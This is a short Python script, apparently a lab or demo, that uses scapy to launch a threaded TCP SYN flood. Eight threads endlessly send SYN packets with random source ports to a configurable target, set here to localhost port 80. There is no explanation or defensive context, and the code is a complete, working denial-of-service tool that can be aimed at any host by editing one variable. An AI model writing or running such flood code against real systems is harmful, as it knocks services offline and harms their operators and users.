from scapy.all import IP, TCP, send
import random
import threading

target_ip = "127.0.0.1"
target_port = 80

def flood():
    pkt = IP(dst=target_ip) / TCP(
        sport=random.randint(1024, 65535),
        dport=target_port,
        flags="S"
    )
    send(pkt, loop=1, inter=0, verbose=False)

threads = []
for _ in range(8):   # 8 threads = visible flood
    t = threading.Thread(target=flood)
    t.start()
    threads.append(t)

for t in threads:
    t.join()